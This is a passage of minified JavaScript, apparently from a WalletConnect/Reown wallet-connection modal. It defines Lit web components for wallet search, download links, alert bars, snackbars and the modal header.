      `}onConnectWallet(t){ae.selectWalletConnector(t)}};gl.styles=hZ,g0([le()],gl.prototype,"loading",void 0),g0([F()],gl.prototype,"query",void 0),g0([F()],gl.prototype,"badge",void 0),gl=g0([he("w3m-all-wallets-search")],gl);var gm=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let fd=class extends fe{constructor(){super(...arguments),this.search="",this.onDebouncedSearch=te.debounce(t=>{this.search=t})}render(){const t=this.search.length>=2;return U`
      <wui-flex .padding=${["0","s","s","s"]} gap="xs">
        <wui-search-bar @inputChange=${this.onInputChange.bind(this)}></wui-search-bar>
        <wui-certified-switch
          ?checked=${this.badge}
          @click=${this.onClick.bind(this)}
          data-testid="wui-certified-switch"
        ></wui-certified-switch>
        ${this.qrButtonTemplate()}
      </wui-flex>
      ${t||this.badge?U`<w3m-all-wallets-search
            query=${this.search}
            badge=${Ee(this.badge)}
          ></w3m-all-wallets-search>`:U`<w3m-all-wallets-list badge=${Ee(this.badge)}></w3m-all-wallets-list>`}
    `}onInputChange(t){this.onDebouncedSearch(t.detail)}onClick(){if(this.badge==="certified"){this.badge=void 0;return}this.badge="certified",ut.showSvg("Only WalletConnect certified",{icon:"walletConnectBrown",iconColor:"accent-100"})}qrButtonTemplate(){return te.isMobile()?U`
        <wui-icon-box
          size="lg"
          iconSize="xl"
          iconColor="accent-100"
          backgroundColor="accent-100"
          icon="qrCode"
          background="transparent"
          border
          borderColor="wui-accent-glass-010"
          @click=${this.onWalletConnectQr.bind(this)}
        ></wui-icon-box>
      `:null}onWalletConnectQr(){se.push("ConnectingWalletConnect")}};gm([le()],fd.prototype,"search",void 0),gm([le()],fd.prototype,"badge",void 0),fd=gm([he("w3m-all-wallets-view")],fd);var dZ=Ae`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 11px 18px 11px var(--wui-spacing-s);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
    transition:
      color var(--wui-ease-out-power-1) var(--wui-duration-md),
      background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: color, background-color;
  }

  button[data-iconvariant='square'],
  button[data-iconvariant='square-blue'] {
    padding: 6px 18px 6px 9px;
  }

  button > wui-flex {
    flex: 1;
  }

  button > wui-image {
    width: 32px;
    height: 32px;
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
    border-radius: var(--wui-border-radius-3xl);
  }

  button > wui-icon {
    width: 36px;
    height: 36px;
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
  }

  button > wui-icon-box[data-variant='blue'] {
    box-shadow: 0 0 0 2px var(--wui-color-accent-glass-005);
  }

  button > wui-icon-box[data-variant='overlay'] {
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
  }

  button > wui-icon-box[data-variant='square-blue'] {
    border-radius: var(--wui-border-radius-3xs);
    position: relative;
    border: none;
    width: 36px;
    height: 36px;
  }

  button > wui-icon-box[data-variant='square-blue']::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-color-accent-glass-010);
    pointer-events: none;
  }

  button > wui-icon:last-child {
    width: 14px;
    height: 14px;
  }

  button:disabled {
    color: var(--wui-color-gray-glass-020);
  }

  button[data-loading='true'] > wui-icon {
    opacity: 0;
  }

  wui-loading-spinner {
    position: absolute;
    right: 18px;
    top: 50%;
    transform: translateY(-50%);
  }
`,Yn=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let nn=class extends fe{constructor(){super(...arguments),this.tabIdx=void 0,this.variant="icon",this.disabled=!1,this.imageSrc=void 0,this.alt=void 0,this.chevron=!1,this.loading=!1}render(){return U`
      <button
        ?disabled=${this.loading?!0:!!this.disabled}
        data-loading=${this.loading}
        data-iconvariant=${Ee(this.iconVariant)}
        tabindex=${Ee(this.tabIdx)}
      >
        ${this.loadingTemplate()} ${this.visualTemplate()}
        <wui-flex gap="3xs">
          <slot></slot>
        </wui-flex>
        ${this.chevronTemplate()}
      </button>
    `}visualTemplate(){if(this.variant==="image"&&this.imageSrc)return U`<wui-image src=${this.imageSrc} alt=${this.alt??"list item"}></wui-image>`;if(this.iconVariant==="square"&&this.icon&&this.variant==="icon")return U`<wui-icon name=${this.icon}></wui-icon>`;if(this.variant==="icon"&&this.icon&&this.iconVariant){const e=["blue","square-blue"].includes(this.iconVariant)?"accent-100":"fg-200",r=this.iconVariant==="square-blue"?"mdl":"md",n=this.iconSize?this.iconSize:r;return U`
        <wui-icon-box
          data-variant=${this.iconVariant}
          icon=${this.icon}
          iconSize=${n}
          background="transparent"
          iconColor=${e}
          backgroundColor=${e}
          size=${r}
        ></wui-icon-box>
      `}return null}loadingTemplate(){return this.loading?U`<wui-loading-spinner
        data-testid="wui-list-item-loading-spinner"
        color="fg-300"
      ></wui-loading-spinner>`:U``}chevronTemplate(){return this.chevron?U`<wui-icon size="inherit" color="fg-200" name="chevronRight"></wui-icon>`:null}};nn.styles=[Qe,hr,dZ],Yn([F()],nn.prototype,"icon",void 0),Yn([F()],nn.prototype,"iconSize",void 0),Yn([F()],nn.prototype,"tabIdx",void 0),Yn([F()],nn.prototype,"variant",void 0),Yn([F()],nn.prototype,"iconVariant",void 0),Yn([F({type:Boolean})],nn.prototype,"disabled",void 0),Yn([F()],nn.prototype,"imageSrc",void 0),Yn([F()],nn.prototype,"alt",void 0),Yn([F({type:Boolean})],nn.prototype,"chevron",void 0),Yn([F({type:Boolean})],nn.prototype,"loading",void 0),nn=Yn([he("wui-list-item")],nn);var fZ=function(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Wy=class extends fe{constructor(){var t;super(...arguments),this.wallet=(t=se.state.data)==null?void 0:t.wallet}render(){if(!this.wallet)throw new Error("w3m-downloads-view");return U`
      <wui-flex gap="xs" flexDirection="column" .padding=${["s","s","l","s"]}>
        ${this.chromeTemplate()} ${this.iosTemplate()} ${this.androidTemplate()}
        ${this.homepageTemplate()}
      </wui-flex>
    `}chromeTemplate(){var t;return(t=this.wallet)!=null&&t.chrome_store?U`<wui-list-item
      variant="icon"
      icon="chromeStore"
      iconVariant="square"
      @click=${this.onChromeStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">Chrome Extension</wui-text>
    </wui-list-item>`:null}iosTemplate(){var t;return(t=this.wallet)!=null&&t.app_store?U`<wui-list-item
      variant="icon"
      icon="appStore"
      iconVariant="square"
      @click=${this.onAppStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">iOS App</wui-text>
    </wui-list-item>`:null}androidTemplate(){var t;return(t=this.wallet)!=null&&t.play_store?U`<wui-list-item
      variant="icon"
      icon="playStore"
      iconVariant="square"
      @click=${this.onPlayStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">Android App</wui-text>
    </wui-list-item>`:null}homepageTemplate(){var t;return(t=this.wallet)!=null&&t.homepage?U`
      <wui-list-item
        variant="icon"
        icon="browser"
        iconVariant="square-blue"
        @click=${this.onHomePage.bind(this)}
        chevron
      >
        <wui-text variant="paragraph-500" color="fg-100">Website</wui-text>
      </wui-list-item>
    `:null}onChromeStore(){var t;(t=this.wallet)!=null&&t.chrome_store&&te.openHref(this.wallet.chrome_store,"_blank")}onAppStore(){var t;(t=this.wallet)!=null&&t.app_store&&te.openHref(this.wallet.app_store,"_blank")}onPlayStore(){var t;(t=this.wallet)!=null&&t.play_store&&te.openHref(this.wallet.play_store,"_blank")}onHomePage(){var t;(t=this.wallet)!=null&&t.homepage&&te.openHref(this.wallet.homepage,"_blank")}};Wy=fZ([he("w3m-downloads-view")],Wy);var pZ=Object.freeze({__proto__:null,get W3mConnectingWcBasicView(){return L0},get W3mAllWalletsView(){return fd},get W3mDownloadsView(){return Wy}}),gZ=Ae`
  :host {
    display: block;
    border-radius: clamp(0px, var(--wui-border-radius-l), 44px);
    box-shadow: 0 0 0 1px var(--wui-color-gray-glass-005);
    background-color: var(--wui-color-modal-bg);
    overflow: hidden;
  }

  :host([data-embedded='true']) {
    box-shadow:
      0 0 0 1px var(--wui-color-gray-glass-005),
      0px 4px 12px 4px var(--w3m-card-embedded-shadow-color);
  }
`,wZ=function(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let wm=class extends fe{render(){return U`<slot></slot>`}};wm.styles=[Qe,gZ],wm=wZ([he("wui-card")],wm);var mZ=Ae`
  :host {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-s);
    border: 1px solid var(--wui-color-dark-glass-100);
    box-sizing: border-box;
    background-color: var(--wui-color-bg-325);
    box-shadow: 0px 0px 16px 0px rgba(0, 0, 0, 0.25);
  }

  wui-flex {
    width: 100%;
  }

  wui-text {
    word-break: break-word;
    flex: 1;
  }

  .close {
    cursor: pointer;
  }

  .icon-box {
    height: 40px;
    width: 40px;
    border-radius: var(--wui-border-radius-3xs);
    background-color: var(--local-icon-bg-value);
  }
`,Yh=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let ha=class extends fe{constructor(){super(...arguments),this.message="",this.backgroundColor="accent-100",this.iconColor="accent-100",this.icon="info"}render(){return this.style.cssText=`
      --local-icon-bg-value: var(--wui-color-${this.backgroundColor});
   `,U`
      <wui-flex flexDirection="row" justifyContent="space-between" alignItems="center">
        <wui-flex columnGap="xs" flexDirection="row" alignItems="center">
          <wui-flex
            flexDirection="row"
            alignItems="center"
            justifyContent="center"
            class="icon-box"
          >
            <wui-icon color=${this.iconColor} size="md" name=${this.icon}></wui-icon>
          </wui-flex>
          <wui-text variant="small-500" color="bg-350" data-testid="wui-alertbar-text"
            >${this.message}</wui-text
          >
        </wui-flex>
        <wui-icon
          class="close"
          color="bg-350"
          size="sm"
          name="close"
          @click=${this.onClose}
        ></wui-icon>
      </wui-flex>
    `}onClose(){Lo.close()}};ha.styles=[Qe,mZ],Yh([F()],ha.prototype,"message",void 0),Yh([F()],ha.prototype,"backgroundColor",void 0),Yh([F()],ha.prototype,"iconColor",void 0),Yh([F()],ha.prototype,"icon",void 0),ha=Yh([he("wui-alertbar")],ha);var yZ=Ae`
  :host {
    display: block;
    position: absolute;
    top: var(--wui-spacing-s);
    left: var(--wui-spacing-l);
    right: var(--wui-spacing-l);
    opacity: 0;
    pointer-events: none;
  }
`,O8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};const bZ={info:{backgroundColor:"fg-350",iconColor:"fg-325",icon:"info"},success:{backgroundColor:"success-glass-reown-020",iconColor:"success-125",icon:"checkmark"},warning:{backgroundColor:"warning-glass-reown-020",iconColor:"warning-100",icon:"warningCircle"},error:{backgroundColor:"error-glass-reown-020",iconColor:"error-125",icon:"exclamationTriangle"}};let w0=class extends fe{constructor(){super(),this.unsubscribe=[],this.open=Lo.state.open,this.onOpen(!0),this.unsubscribe.push(Lo.subscribeKey("open",t=>{this.open=t,this.onOpen(!1)}))}disconnectedCallback(){this.unsubscribe.forEach(t=>t())}render(){const{message:t,variant:e}=Lo.state,r=bZ[e];return U`
      <wui-alertbar
        message=${t}
        backgroundColor=${r==null?void 0:r.backgroundColor}
        iconColor=${r==null?void 0:r.iconColor}
        icon=${r==null?void 0:r.icon}
      ></wui-alertbar>
    `}onOpen(t){this.open?(this.animate([{opacity:0,transform:"scale(0.85)"},{opacity:1,transform:"scale(1)"}],{duration:150,fill:"forwards",easing:"ease"}),this.style.cssText="pointer-events: auto"):t||(this.animate([{opacity:1,transform:"scale(1)"},{opacity:0,transform:"scale(0.85)"}],{duration:150,fill:"forwards",easing:"ease"}),this.style.cssText="pointer-events: none")}};w0.styles=yZ,O8([le()],w0.prototype,"open",void 0),w0=O8([he("w3m-alertbar")],w0);var vZ=Ae`
  button {
    border-radius: var(--local-border-radius);
    color: var(--wui-color-fg-100);
    padding: var(--local-padding);
  }

  @media (max-width: 700px) {
    button {
      padding: var(--wui-spacing-s);
    }
  }

  button > wui-icon {
    pointer-events: none;
  }

  button:disabled > wui-icon {
    color: var(--wui-color-bg-300) !important;
  }

  button:disabled {
    background-color: transparent;
  }
`,Xh=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let da=class extends fe{constructor(){super(...arguments),this.size="md",this.disabled=!1,this.icon="copy",this.iconColor="inherit"}render(){const t=this.size==="lg"?"--wui-border-radius-xs":"--wui-border-radius-xxs",e=this.size==="lg"?"--wui-spacing-1xs":"--wui-spacing-2xs";return this.style.cssText=`
    --local-border-radius: var(${t});
    --local-padding: var(${e});
`,U`
      <button ?disabled=${this.disabled}>
        <wui-icon color=${this.iconColor} size=${this.size} name=${this.icon}></wui-icon>
      </button>
    `}};da.styles=[Qe,hr,ip,vZ],Xh([F()],da.prototype,"size",void 0),Xh([F({type:Boolean})],da.prototype,"disabled",void 0),Xh([F()],da.prototype,"icon",void 0),Xh([F()],da.prototype,"iconColor",void 0),da=Xh([he("wui-icon-link")],da);var EZ=Ae`
  button {
    display: block;
    display: flex;
    align-items: center;
    padding: var(--wui-spacing-xxs);
    gap: var(--wui-spacing-xxs);
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-md);
    border-radius: var(--wui-border-radius-xxs);
  }

  wui-image {
    border-radius: 100%;
    width: var(--wui-spacing-xl);
    height: var(--wui-spacing-xl);
  }

  wui-icon-box {
    width: var(--wui-spacing-xl);
    height: var(--wui-spacing-xl);
  }

  button:hover {
    background-color: var(--wui-color-gray-glass-002);
  }

  button:active {
    background-color: var(--wui-color-gray-glass-005);
  }
`,_8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let m0=class extends fe{constructor(){super(...arguments),this.imageSrc=""}render(){return U`<button>
      ${this.imageTemplate()}
      <wui-icon size="xs" color="fg-200" name="chevronBottom"></wui-icon>
    </button>`}imageTemplate(){return this.imageSrc?U`<wui-image src=${this.imageSrc} alt="select visual"></wui-image>`:U`<wui-icon-box
      size="xxs"
      iconColor="fg-200"
      backgroundColor="fg-100"
      background="opaque"
      icon="networkPlaceholder"
    ></wui-icon-box>`}};m0.styles=[Qe,hr,ip,EZ],_8([F()],m0.prototype,"imageSrc",void 0),m0=_8([he("wui-select")],m0);var CZ=Ae`
  :host {
    height: 64px;
  }

  wui-text {
    text-transform: capitalize;
  }

  wui-flex.w3m-header-title {
    transform: translateY(0);
    opacity: 1;
  }

  wui-flex.w3m-header-title[view-direction='prev'] {
    animation:
      slide-down-out 120ms forwards var(--wui-ease-out-power-2),
      slide-down-in 120ms forwards var(--wui-ease-out-power-2);
    animation-delay: 0ms, 200ms;
  }

  wui-flex.w3m-header-title[view-direction='next'] {
    animation:
      slide-up-out 120ms forwards var(--wui-ease-out-power-2),
      slide-up-in 120ms forwards var(--wui-ease-out-power-2);
    animation-delay: 0ms, 200ms;
  }

  wui-icon-link[data-hidden='true'] {
    opacity: 0 !important;
    pointer-events: none;
  }

  @keyframes slide-up-out {
    from {
      transform: translateY(0px);
      opacity: 1;
    }
    to {
      transform: translateY(3px);
      opacity: 0;
    }
  }

  @keyframes slide-up-in {
    from {
      transform: translateY(-3px);
      opacity: 0;
    }
    to {
      transform: translateY(0);
      opacity: 1;
    }
  }

  @keyframes slide-down-out {
    from {
      transform: translateY(0px);
      opacity: 1;
    }
    to {
      transform: translateY(-3px);
      opacity: 0;
    }
  }

  @keyframes slide-down-in {
    from {
      transform: translateY(3px);
      opacity: 0;
    }
    to {
      transform: translateY(0);
      opacity: 1;
    }
  }
`,Ii=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};const AZ=["SmartSessionList"];function mm(){var s,o,a,c,l,u,h;const t=(o=(s=se.state.data)==null?void 0:s.connector)==null?void 0:o.name,e=(c=(a=se.state.data)==null?void 0:a.wallet)==null?void 0:c.name,r=(u=(l=se.state.data)==null?void 0:l.network)==null?void 0:u.name,n=e??t,i=ae.getConnectors();return{Connect:`Connect ${i.length===1&&((h=i[0])==null?void 0:h.id)==="w3m-email"?"Email":""} Wallet`,Create:"Create Wallet",ChooseAccountName:void 0,Account:void 0,AccountSettings:void 0,AllWallets:"All Wallets",ApproveTransaction:"Approve Transaction",BuyInProgress:"Buy",ConnectingExternal:n??"Connect Wallet",ConnectingWalletConnect:n??"WalletConnect",ConnectingWalletConnectBasic:"WalletConnect",ConnectingSiwe:"Sign In",Convert:"Convert",ConvertSelectToken:"Select token",ConvertPreview:"Preview convert",Downloads:n?`Get ${n}`:"Downloads",EmailLogin:"Email Login",EmailVerifyOtp:"Confirm Email",EmailVerifyDevice:"Register Device",GetWallet:"Get a wallet",Networks:"Choose Network",OnRampProviders:"Choose Provider",OnRampActivity:"Activity",OnRampTokenSelect:"Select Token",OnRampFiatSelect:"Select Currency",Profile:void 0,SwitchNetwork:r??"Switch Network",SwitchAddress:"Switch Address",Transactions:"Activity",UnsupportedChain:"Switch Network",UpgradeEmailWallet:"Upgrade your Wallet",UpdateEmailWallet:"Edit Email",UpdateEmailPrimaryOtp:"Confirm Current Email",UpdateEmailSecondaryOtp:"Confirm New Email",WhatIsABuy:"What is Buy?",RegisterAccountName:"Choose name",RegisterAccountNameSuccess:"",WalletReceive:"Receive",WalletCompatibleNetworks:"Compatible Networks",Swap:"Swap",SwapSelectToken:"Select token",SwapPreview:"Preview swap",WalletSend:"Send",WalletSendPreview:"Review send",WalletSendSelectToken:"Select Token",WhatIsANetwork:"What is a network?",WhatIsAWallet:"What is a wallet?",ConnectWallets:"Connect wallet",ConnectSocials:"All socials",ConnectingSocial:me.state.socialProvider?me.state.socialProvider:"Connect Social",ConnectingMultiChain:"Select chain",ConnectingFarcaster:"Farcaster",SwitchActiveChain:"Switch chain",SmartSessionCreated:void 0,SmartSessionList:"Smart Sessions",SIWXSignMessage:"Sign In"}}let kn=class extends fe{constructor(){super(),this.unsubscribe=[],this.heading=mm()[se.state.view],this.network=B.state.activeCaipNetwork,this.networkImage=Mt.getNetworkImage(this.network),this.buffering=!1,this.showBack=!1,this.prevHistoryLength=1,this.view=se.state.view,this.viewDirection="",this.headerText=mm()[se.state.view],this.unsubscribe.push(Wr.subscribeNetworkImages(()=>{this.networkImage=Mt.getNetworkImage(this.network)}),se.subscribeKey("view",t=>{setTimeout(()=>{this.view=t,this.headerText=mm()[t]},Do.ANIMATION_DURATIONS.HeaderText),this.onViewChange(),this.onHistoryChange()}),we.subscribeKey("buffering",t=>this.buffering=t),B.subscribeKey("activeCaipNetwork",t=>{this.network=t,this.networkImage=Mt.getNetworkImage(this.network)}))}disconnectCallback(){this.unsubscribe.forEach(t=>t())}render(){return U`
      <wui-flex .padding=${this.getPadding()} justifyContent="space-between" alignItems="center">
        ${this.leftHeaderTemplate()} ${this.titleTemplate()} ${this.rightHeaderTemplate()}
      </wui-flex>
    `}onWalletHelp(){De.sendEvent({type:"track",event:"CLICK_WALLET_HELP"}),se.push("WhatIsAWallet")}async onClose(){se.state.view==="UnsupportedChain"||await Uo.isSIWXCloseDisabled()?qe.shake():qe.close()}rightHeaderTemplate(){var e,r;const t=(r=(e=Y==null?void 0:Y.state)==null?void 0:e.features)==null?void 0:r.smartSessions;return se.state.view!=="Account"||!t?this.closeButtonTemplate():U`<wui-flex>
      <wui-icon-link
        icon="clock"
        @click=${()=>se.push("SmartSessionList")}
        data-testid="w3m-header-smart-sessions"
      ></wui-icon-link>
      ${this.closeButtonTemplate()}
    </wui-flex> `}closeButtonTemplate(){return U`
      <wui-icon-link
        ?disabled=${this.buffering}
        icon="close"
        @click=${this.onClose.bind(this)}
        data-testid="w3m-header-close"
      ></wui-icon-link>
    `}titleTemplate(){const t=AZ.includes(this.view);return U`
      <wui-flex
        view-direction="${this.viewDirection}"
        class="w3m-header-title"
        alignItems="center"
        gap="xs"
      >
        <wui-text variant="paragraph-700" color="fg-100" data-testid="w3m-header-text"
          >${this.headerText}</wui-text
        >
        ${t?U`<wui-tag variant="main">Beta</wui-tag>`:null}
      </wui-flex>
    `}leftHeaderTemplate(){var c;const{view:t}=se.state,e=t==="Connect",r=Y.state.enableEmbedded,n=t==="ApproveTransaction",i=t==="ConnectingSiwe",s=t==="Account",o=Y.state.enableNetworkSwitch,a=n||i||e&&r;return s&&o?U`<wui-select
        id="dynamic"
        data-testid="w3m-account-select-network"
        active-network=${Ee((c=this.network)==null?void 0:c.name)}
        @click=${this.onNetworks.bind(this)}
        imageSrc=${Ee(this.networkImage)}
      ></wui-select>`:this.showBack&&!a?U`<wui-icon-link
        data-testid="header-back"
        id="dynamic"
        icon="chevronLeft"
        ?disabled=${this.buffering}
        @click=${this.onGoBack.bind(this)}
      ></wui-icon-link>`:U`<wui-icon-link
      data-hidden=${!e}
      id="dynamic"
      icon="helpCircle"
      @click=${this.onWalletHelp.bind(this)}
    ></wui-icon-link>`}onNetworks(){this.isAllowedNetworkSwitch()&&(De.sendEvent({type:"track",event:"CLICK_NETWORKS"}),se.push("Networks"))}isAllowedNetworkSwitch(){const t=B.getAllRequestedCaipNetworks(),e=t?t.length>1:!1,r=t==null?void 0:t.find(({id:n})=>{var i;return n===((i=this.network)==null?void 0:i.id)});return e||!r}getPadding(){return this.heading?["l","2l","l","2l"]:["0","2l","0","2l"]}onViewChange(){const{history:t}=se.state;let e=Do.VIEW_DIRECTION.Next;t.length<this.prevHistoryLength&&(e=Do.VIEW_DIRECTION.Prev),this.prevHistoryLength=t.length,this.viewDirection=e}async onHistoryChange(){var r;const{history:t}=se.state,e=(r=this.shadowRoot)==null?void 0:r.querySelector("#dynamic");t.length>1&&!this.showBack&&e?(await e.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.showBack=!0,e.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"})):t.length<=1&&this.showBack&&e&&(await e.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.showBack=!1,e.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}onGoBack(){se.goBack()}};kn.styles=CZ,Ii([le()],kn.prototype,"heading",void 0),Ii([le()],kn.prototype,"network",void 0),Ii([le()],kn.prototype,"networkImage",void 0),Ii([le()],kn.prototype,"buffering",void 0),Ii([le()],kn.prototype,"showBack",void 0),Ii([le()],kn.prototype,"prevHistoryLength",void 0),Ii([le()],kn.prototype,"view",void 0),Ii([le()],kn.prototype,"viewDirection",void 0),Ii([le()],kn.prototype,"headerText",void 0),kn=Ii([he("w3m-header")],kn);var xZ=Ae`
  :host {
    display: flex;
    column-gap: var(--wui-spacing-s);
    align-items: center;
    padding: var(--wui-spacing-xs) var(--wui-spacing-m) var(--wui-spacing-xs) var(--wui-spacing-xs);
    border-radius: var(--wui-border-radius-s);
    border: 1px solid var(--wui-color-gray-glass-005);
    box-sizing: border-box;
    background-color: var(--wui-color-bg-175);
    box-shadow:
      0px 14px 64px -4px rgba(0, 0, 0, 0.15),
      0px 8px 22px -6px rgba(0, 0, 0, 0.15);

    max-width: 300px;
  }

  :host wui-loading-spinner {
    margin-left: var(--wui-spacing-3xs);
  }
`,fa=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let hs=class extends fe{constructor(){super(...arguments),this.backgroundColor="accent-100",this.iconColor="accent-100",this.icon="checkmark",this.message="",this.loading=!1,this.iconType="default"}render(){return U`
      ${this.templateIcon()}
      <wui-text variant="paragraph-500" color="fg-100" data-testid="wui-snackbar-message"
        >${this.message}</wui-text
      >
    `}templateIcon(){return this.loading?U`<wui-loading-spinner size="md" color="accent-100"></wui-loading-spinner>`:this.iconType==="default"?U`<wui-icon size="xl" color=${this.iconColor} name=${this.icon}></wui-icon>`:U`<wui-icon-box
      size="sm"
      iconSize="xs"
      iconColor=${this.iconColor}
      backgroundColor=${this.backgroundColor}
      icon=${this.icon}
      background="opaque"
    ></wui-icon-box>`}};hs.styles=[Qe,xZ],fa([F()],hs.prototype,"backgroundColor",void 0),fa([F()],hs.prototype,"iconColor",void 0),fa([F()],hs.prototype,"icon",void 0),fa([F()],hs.prototype,"message",void 0),fa([F()],hs.prototype,"loading",void 0),fa([F()],hs.prototype,"iconType",void 0),hs=fa([he("wui-snackbar")],hs);var IZ=Ae`
  :host {
    display: block;
    position: absolute;
    opacity: 0;
    pointer-events: none;
    top: 11px;
    left: 50%;
    width: max-content;
  }
`,T8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};const SZ={loading:void 0,success:{backgroundColor:"success-100",iconColor:"success-100",icon:"checkmark"},error:{backgroundColor:"error-100",iconColor:"error-100",icon:"close"}};let y0=class extends fe{constructor(){super(),this.unsubscribe=[],this.timeout=void 0,this.open=ut.state.open,this.unsubscribe.push(ut.subscribeKey("open",t=>{this.open=t,this.onOpen()}))}disconnectedCallback(){clearTimeout(this.timeout),this.unsubscribe.forEach(t=>t())}render(){const{message:t,variant:e,svg:r}=ut.state,n=SZ[e],{icon:i,iconColor:s}=r??n??{};return U`
      <wui-snackbar
        message=${t}
        backgroundColor=${n==null?void 0:n.backgroundColor}
        iconColor=${s}
        icon=${i}
        .loading=${e==="loading"}
      ></wui-snackbar>
    `}onOpen(){clearTimeout(this.timeout),this.open?(this.animate([{opacity:0,transform:"translateX(-50%) scale(0.85)"},{opacity:1,transform:"translateX(-50%) scale(1)"}],{duration:150,fill:"forwards",easing:"ease"}),this.timeout&&clearTimeout(this.timeout),ut.state.autoClose&&(this.timeout=setTimeout(()=>ut.hide(),2500))):this.animate([{opacity:1,transform:"translateX(-50%) scale(1)"},{opacity:0,transform:"translateX(-50%) scale(0.85)"}],{duration:150,fill:"forwards",easing:"ease"})}};y0.styles=IZ,T8([le()],y0.prototype,"open",void 0),y0=T8([he("w3m-snackbar")],y0);var NZ=Ae`
  :host {
    pointer-events: none;
  }

  :host > wui-flex {
    display: var(--w3m-tooltip-display);
    opacity: var(--w3m-tooltip-opacity);
    padding: 9px var(--wui-spacing-s) 10px var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xxs);
    color: var(--wui-color-bg-100);
    position: fixed;
    top: var(--w3m-tooltip-top);
    left: var(--w3m-tooltip-left);
    transform: translate(calc(-50% + var(--w3m-tooltip-parent-width)), calc(-100% - 8px));
    max-width: calc(var(--w3m-modal-width) - var(--wui-spacing-xl));
    transition: opacity 0.2s var(--wui-ease-out-power-2);
    will-change: opacity;
  }

  :host([data-variant='shade']) > wui-flex {
    background-color: var(--wui-color-bg-150);
    border: 1px solid var(--wui-color-gray-glass-005);
  }

  :host([data-variant='shade']) > wui-flex > wui-text {
    color: var(--wui-color-fg-150);
  }

  :host([data-variant='fill']) > wui-flex {
